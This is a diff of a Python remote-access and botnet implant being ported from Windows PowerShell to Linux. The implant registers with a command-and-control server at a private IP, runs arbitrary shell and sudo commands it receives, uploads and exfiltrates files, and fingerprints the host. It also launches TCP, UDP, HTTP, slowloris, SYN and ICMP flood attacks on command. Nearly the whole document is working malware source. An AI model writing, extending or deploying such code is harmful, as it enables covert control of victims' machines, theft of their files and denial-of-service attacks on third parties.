@@ -1,5 +1,5 @@
+#!/usr/bin/env python3
 import asyncio
-import ctypes
 import json
 import subprocess
 import signal
@@ -10,14 +10,16 @@ import socket
 import random
 import threading
 import time
+import uuid
+import re
+import platform
+import netifaces
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
 import requests
 
-
-
-class Impl:
+class LinuxImpl:
     def __init__(self, c2_ws_url: str, group: str = "grupo"):
         self.c2_ws_url = c2_ws_url
         self.group = group
@@ -25,12 +27,12 @@ class Impl:
         self.upload_buffer = []
         self.upload_destination = None
         self.running = True
-        
+        self.attack_thread = None
         self.attacks=[]
         
-        
+
+    
     async def run(self) -> None:
-       
         await self.register()
         while self.running:
             try:
@@ -38,37 +40,33 @@ class Impl:
             except Exception as e:
                 await asyncio.sleep(5)
     
-
     async def _connect_to_c2(self) -> None:
-        async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
-            while self.running:
-                await self._handle_commands(ws)
-    
+        try:
+            async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
+                while self.running:
+                    await self._handle_commands(ws)
+        except Exception as e:
+            pass    
+        #print(e)
 
     async def _handle_commands(self, ws) -> None:
-       
         try:
             cmd = await ws.recv()
             data = json.loads(cmd.replace("'", '"'))
+
             
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
-
             elif 'chunk' in data:
                 await self._handle_file_upload(ws, data)
-
             elif 'list_files' in data:
                 await self._list_directory(ws, data.get('path', self.current_dir))
-
             elif 'get_files' in data:
-                path=data['get_files']
-                await self._send_file(ws, str(path))
-
+                await self._send_file(ws, data['get_files'])
             elif 'attack' in data:
                 await self._handle_attack_command(ws, data)
-
             elif 'stop_attack' in data:
-                await self._stop_attack(ws, data['stop_attack'])
+                await self._stop_attack(ws, attack_type=data['stop_attack'])
         
         except ConnectionClosedError:
             pass
@@ -76,20 +74,39 @@ class Impl:
             await ws.send(json.dumps({"error": str(e)}))
     
     async def _execute_command(self, ws, command: str) -> None:
-       
         command = command.strip()
-        
+        print(command)
         if command.startswith("cd "):
             await self._change_directory(ws, command[3:].strip())
         else:
-            out, err, cwd = self._execute_shell_command(command)
+            if command.startswith("sudo ") or command.startswith("sudo"):
+
+                print("assudo")
+                await ws.send(json.dumps({"prompt": "sudo password: "}))
+                msg = await ws.recv()
+
+                data = json.loads(msg.replace("'", '"'))
+                password = data['pass']
+               
+                #replacement = if 
+                print(f'"echo {password}" | sudo -S {command.replace("sudo","")}')
+                proc = subprocess.Popen(
+                    ['/bin/bash', '-c', f'cd "{self.current_dir}" && "echo {password}" | sudo -S {command.replace("sudo","")}'],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                out, err = proc.communicate(password + "\n", timeout=60)
+            else:
+                out, err, _ = self._execute_shell_command(command)
+
             await ws.send(json.dumps({
                 "result": out if out else err,
-                "cwd": cwd
+                "cwd": self.current_dir
             }))
     
     async def _change_directory(self, ws, path: str) -> None:
-       
         path = path.replace('"', '')
         if path == "..":
             self.current_dir = os.path.dirname(self.current_dir)
@@ -99,7 +116,7 @@ class Impl:
                 self.current_dir = new_path
             else:
                 await ws.send(json.dumps({
-                    "error": f"El directorio '{path}' no existe.",
+                    "error": f"Directory '{path}' doesn't exists.",
                     "cwd": self.current_dir
                 }))
                 return
@@ -111,18 +128,19 @@ class Impl:
         }))
     
     def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
-       
-        escaped_cmd = command.replace('"', '"')
-        result = subprocess.run(
-            ['powershell.exe', '-Command', f'Set-Location "{self.current_dir}"; {escaped_cmd}'],
-            capture_output=True, 
-            text=True,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        return result.stdout, result.stderr, self.current_dir
+        try:
+            result = subprocess.run(
+                ['/bin/bash', '-c', f'cd "{self.current_dir}" && {command}'],
+                capture_output=True, 
+                text=True,
+                timeout=60
+            )
+            
+            return result.stdout, result.stderr, self.current_dir
+        except subprocess.TimeoutExpired:
+            return "", "Command has exceeded execution timeout", self.current_dir
     
     async def _handle_file_upload(self, ws, data: Dict) -> None:
-       
         try:
             part = base64.b64decode(data['chunk']['data'])
             is_last = data['chunk'].get('last', False)
@@ -137,6 +155,7 @@ class Impl:
                     for chunk in self.upload_buffer:
                         f.write(chunk)
                 
+                # Limpieza del buffer
                 self.upload_buffer.clear()
                 self.upload_destination = None
                 
@@ -152,7 +171,6 @@ class Impl:
             }))
     
     async def _list_directory(self, ws, path: str) -> None:
-       
         if not os.path.exists(path):
             await ws.send(json.dumps({
                 "error": f"Ruta no encontrada: {path}"
@@ -163,12 +181,22 @@ class Impl:
         try:
             for name in os.listdir(path):
                 full_path = os.path.join(path, name)
-                item_type = "directory" if os.path.isdir(full_path) else "file"
-                items.append({
-                    "name": name,
-                    "type": item_type,
-                    "size": os.path.getsize(full_path) if item_type == "file" else 0
-                })
+                try:
+                    item_type = "directory" if os.path.isdir(full_path) else "file"
+                    size = os.path.getsize(full_path) if item_type == "file" else 0
+                    items.append({
+                        "name": name,
+                        "type": item_type,
+                        "size": size,
+                        "permissions": oct(os.stat(full_path).st_mode & 0o777)
+                    })
+                except Exception as e:
+                    items.append({
+                        "name": name,
+                        "type": "unknown",
+                        "size": 0,
+                        "error": str(e)
+                    })
             
             await ws.send(json.dumps({
                 "items": items,
@@ -182,22 +210,20 @@ class Impl:
                 "status": "error"
             }))
     
-    async def _send_file(self, ws, file_path:str) -> None:
-
-        if file_path.startswith("//"):
-            file_path=file_path.replace("//","/")
-
-
+    async def _send_file(self, ws, file_path: str) -> None:
         if not os.path.isfile(file_path):
             await ws.send(json.dumps({
                 "error": f"Archivo no encontrado: {file_path}",
                 "status": "error"
             }))
             return
-
+        
         CHUNK_SIZE = 64 * 1024
         try:
             with open(file_path, "rb") as f:
+                content = base64.b64encode(f.read()).decode("utf-8")
+
+
                 while True:
                     chunk = f.read(CHUNK_SIZE)
                     if not chunk:
@@ -213,8 +239,8 @@ class Impl:
                         "last": is_last
                     }))
                     
-                    await asyncio.sleep(0)  
-
+                    await asyncio.sleep(0) 
+            
         except Exception as e:
             await ws.send(json.dumps({
                 "error": str(e),
@@ -228,9 +254,12 @@ class Impl:
         target = data['attack']['target']
         duration = data['attack'].get('duration', 60)
 
+
         if len(self.attacks) == 0:
             
             loop = asyncio.get_event_loop()
+            
+            # Iniciar nuevo ataque
             
             attack_thread = threading.Thread(
                 target=self._execute_attack,
@@ -250,7 +279,7 @@ class Impl:
         else:
             for attack in self.attacks:
                 if attack_type == attack['type']:
-                    next
+                    pass
                 else:
                     loop = asyncio.get_event_loop()
                     
@@ -263,6 +292,7 @@ class Impl:
 
                     self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
 
+
                     await ws.send(json.dumps({
                         "status": "attack_running",
                         "attack_type": attack_type,
@@ -273,7 +303,6 @@ class Impl:
     
     def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop, stop_thread) -> None:
 
-       
         end_time = time.time() + duration
         
         try:
@@ -290,17 +319,18 @@ class Impl:
             elif attack_type == "icmp_flood":
                 self._icmp_flood_attack(target, end_time, stop_thread)
             else:
-                next
+                pass
         except Exception as e:
-            next
+            pass
         finally:
             asyncio.run_coroutine_threadsafe(
                 self._notify_attack_completed(ws, attack_type, target),
                 loop
             )
 
+
+        
     async def _notify_attack_completed(self, ws, attack_type: str, target: str) -> None:
-       
         try:
             await ws.send(json.dumps({
                 "status": "attack_completed",
@@ -309,12 +339,10 @@ class Impl:
                 "message": "Ataque completado"
             }))
         except Exception as e:
-            next
-
+            pass
 
     
     def _tcp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
-       
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
@@ -330,7 +358,6 @@ class Impl:
                 pass
     
     def _udp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
-       
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
@@ -350,14 +377,15 @@ class Impl:
         if not target.startswith(('http://', 'https://')):
             target = 'http://' + target  
         
+        
         socket.setdefaulttimeout(5)  
+        
         
         headers = {
             'User-Agent': 'Mozilla/5.0',
             'Accept': '*/*',
-            'Connection': 'close'  
+            'Connection': 'close'
         }
-        
         
         request = urllib.request.Request(
             url=target,
@@ -365,19 +393,23 @@ class Impl:
             method='GET'
         )
         
+        
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 with urllib.request.urlopen(request) as response:
                     response.read(64)  
+                
                 time.sleep(0.01)
+                
             except urllib.error.URLError as e:
                 break
             except Exception as e:
                 time.sleep(1)  
         
     
+
+    
     def _slowloris_attack(self, target: str, end_time: float, stop_thread) -> None:
-       
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         sockets = []
@@ -394,7 +426,6 @@ class Impl:
                 except:
                     self._close_sockets(sockets)
                     sockets = []
-                
                 for s in sockets:
                     try:
                         s.send("X-a: b\r\n".encode())
@@ -405,7 +436,6 @@ class Impl:
         finally:
             self._close_sockets(sockets)
     
-
     def _syn_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
@@ -415,7 +445,7 @@ class Impl:
                 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 
-                packet = b'\x00' * 64  
+                packet = b'\x00' * 64 
                 s.sendto(packet, (target_ip, target_port))
                 s.close()
             except:
@@ -423,13 +453,14 @@ class Impl:
     
     def _icmp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         import os
+        
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 if os.name == 'nt':
                     os.system(f"ping -n 1 -l 65500 {target} > nul")
             except:
                 pass
-
+    
 
     def _close_sockets(self, sockets: list) -> None:
         for s in sockets:
@@ -440,9 +471,9 @@ class Impl:
     
     async def _stop_attack(self, ws, attack_type) -> None:
 
+
         if len(attack_type) == 0:
             for attack in self.attacks[:]:
-                
                 attack['stop_thread'].set()
                 attack['thread'].join(timeout=5)
                 asyncio.run_coroutine_threadsafe(
@@ -463,10 +494,8 @@ class Impl:
                         attack['loop']
                     )
 
-
     
     async def register(self) -> None:
-       
         model = {
             'impl_mac': self._get_macs(),
             'group': self.group,
@@ -475,51 +504,89 @@ class Impl:
             'operating_system': self._get_operating_system(),
             'impl_id': self.impl_id
         }
-        
-        req = requests.post(f"http://localhost:4444/api/impl/new/{model['impl_id']}", data=model)
-        
+ 
+
+        try:
+            req = requests.post(f"http://192.168.100.12:4444/api/impl/new/{model['impl_id']}", data=model, timeout=10)
+            prin(req.status_code)
+        except Exception as e:
+            #print(e)
+            pass
 
     @property
     def impl_id(self) -> str:
-       
-        output, _, _ = self._execute_shell_command(
-            "(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid"
-        )
-        return str(output).replace('\\n', '').strip()
+        try:
+            with open('/etc/machine-id', 'r') as f:
+                machine_id = f.read().strip()
+                if machine_id:
+                    return machine_id
+        except:
+            pass
+        
+        try:
+            macs = self._get_macs()
+            if macs and macs[0] != 'undefined':
+                return macs[0].replace(':', '')
+        except:
+            pass
+        
+        return str(uuid.uuid4())
     
     def _get_macs(self) -> List[str]:
-       
-        macs_output, err, _ = self._execute_shell_command(
-            "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress"
-        )
-        return [mac.replace("\n", "").replace("\r", "") for mac in macs_output.splitlines()] if macs_output else ['undefined']
+        try:
+            macs = []
+            for interface in netifaces.interfaces():
+                addr = netifaces.ifaddresses(interface)
+                if netifaces.AF_LINK in addr:
+                    mac = addr[netifaces.AF_LINK][0].get('addr')
+                    if mac and mac != '00:00:00:00:00:00':
+                        macs.append(mac)
+            return macs if macs else ['undefined']
+        except:
+            return ['undefined']
     
     def _get_local_ips(self) -> List[str]:
-        ips_output, err, _ = self._execute_shell_command(
-            "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne 'localhost' } | Select-Object -ExpandProperty IPAddress"
-        )
-        return [ip.replace("\n", "").replace("\r", "") for ip in ips_output.splitlines()] if ips_output else ['undefined']
+        try:
+            ips = []
+            for interface in netifaces.interfaces():
+                addr = netifaces.ifaddresses(interface)
+                if netifaces.AF_INET in addr:
+                    ip = addr[netifaces.AF_INET][0].get('addr')
+                    if ip and not ip.startswith('127.'):
+                        ips.append(ip)
+            return ips if ips else ['undefined']
+        except:
+            return ['undefined']
     
     def _get_public_ip(self) -> str:
-       
-        ip_output, err, _ = self._execute_shell_command('Invoke-RestMethod -Uri "https://api.ipify.org"')
-        return ip_output.strip() if ip_output else "undefined"
+        try:
+            response = requests.get('https://api.ipify.org', timeout=5)
+            return response.text.strip() if response.status_code == 200 else "undefined"
+        except:
+            return "undefined"
     
     def _get_operating_system(self) -> str:
-       
-        sysop, err, _ = self._execute_shell_command('(Get-CimInstance Win32_OperatingSystem).Caption')
-        return sysop.strip() if sysop else "undefined"
+        try:
+            with open('/etc/os-release', 'r') as f:
+                for line in f:
+                    if line.startswith('PRETTY_NAME='):
+                        return line.split('=')[1].strip().strip('"')
+        except:
+            pass
+        
+        return f"{platform.system()} {platform.release()}"
     
-
+    def _def_handler(self, sig, frame) -> None:
+        self.running = False
+        sys.exit(1)
 
 if __name__ == "__main__":
+    C2_WS_URL = "ws://192.168.100.12:4444/api/rcv"
+    GROUP_NAME = "grupo"
+
     try:
-        
-        C2_WS_URL = "ws://localhost:4444/api/rcv"
-        GROUP_NAME = "grupo"
-        
-        impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+        impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
         asyncio.run(impl.run())
     except Exception as e:
-        next
-        
+        pass
+        ##print(e)
